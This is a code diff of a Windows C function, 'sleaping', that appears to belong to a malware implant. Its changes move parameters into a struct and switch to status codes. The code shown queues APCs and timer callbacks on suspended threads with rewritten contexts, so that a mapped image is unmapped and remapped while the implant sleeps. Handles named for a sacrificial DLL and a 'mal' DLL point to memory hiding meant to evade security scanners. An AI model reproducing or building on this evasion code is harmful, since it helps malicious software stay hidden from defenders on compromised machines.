@@ -1,6 +1,8 @@
 #include "pch.h"
 #include <Windows.h>
 #include "headers.h"
+#include "types.h"
+#include "sleaping.h"
 
 VOID CALLBACK ResumeThreadCallback(PVOID lpParameter, BOOLEAN TimerOrWaitFired)
 {
@@ -45,14 +47,14 @@ Main thread
     +-- Wait for all threads to complete
 */
 
-int sleaping(
-    PVOID image_base,
-    HANDLE sac_dll_handle,
-    HANDLE mal_dll_handle,
-    SIZE_T view_size,
-    PNT_FUNCTIONS nt_func_s
-)
+status_t sleaping(sleaping_para_t* para)
 {
+
+    PVOID image_base = para->image_base;
+    HANDLE sac_dll_handle = para->sac_dll_handle;
+    HANDLE mal_dll_handle = para->mal_dll_handle;
+    SIZE_T view_size = para->view_size;
+    PNT_FUNCTIONS nt_func_s = para->nt;
 
     HANDLE dummy_event = { 0 };
     HANDLE thread_array[4] = { NULL };
@@ -62,12 +64,12 @@ int sleaping(
     HANDLE timer_unmap = NULL;
     HANDLE timer_map = NULL;
 
-    int result = 0;
+    int status = ST_SUCCESS;
 
     // create a manual sync event to sync threads
     if (!NT_SUCCESS(nt_func_s->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
     {
-        return -1;
+        return ST_ERROR;
     }
 
     // allocate thread context 
@@ -82,7 +84,7 @@ int sleaping(
         || context_3 == NULL
         )
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_event;
     }
 
@@ -96,14 +98,14 @@ int sleaping(
     thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
     if (thread_array[2] == NULL)
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
     // get the context of the waiting thread.
     if (!GetThreadContext(thread_array[2], context_2))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -117,7 +119,7 @@ int sleaping(
 
     if (!SetThreadContext(thread_array[2], context_2))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -125,7 +127,7 @@ int sleaping(
     // resume the thread that is going to wait the sleep time and then execute the APCs
     if (!ResumeThread(thread_array[2]))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -138,7 +140,7 @@ int sleaping(
 
     if (thread_array[0] == NULL || thread_array[1] == NULL || thread_array[3] == NULL)
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -146,7 +148,7 @@ int sleaping(
         !GetThreadContext(thread_array[1], context_1) ||
         !GetThreadContext(thread_array[3], context_3))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -187,7 +189,7 @@ int sleaping(
         !SetThreadContext(thread_array[1], context_1) ||
         !SetThreadContext(thread_array[3], context_3))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
@@ -196,44 +198,44 @@ int sleaping(
     timer_queue = CreateTimerQueue();
     if (timer_queue == NULL)
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_context;
     }
 
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
 
     // unmap
     if (!CreateTimerQueueTimer(&timer_unmap, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
 
     // map
     if (!CreateTimerQueueTimer(&timer_map, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD))
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
 
 
     if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
     {
-        result = -1;
+        status = ST_ERROR;
         goto __clean_up_timer;
     }
 
@@ -256,6 +258,6 @@ __clean_up_event:
     if (dummy_event) CloseHandle(dummy_event);
 
 
-    return result;
+    return status;
 }
 
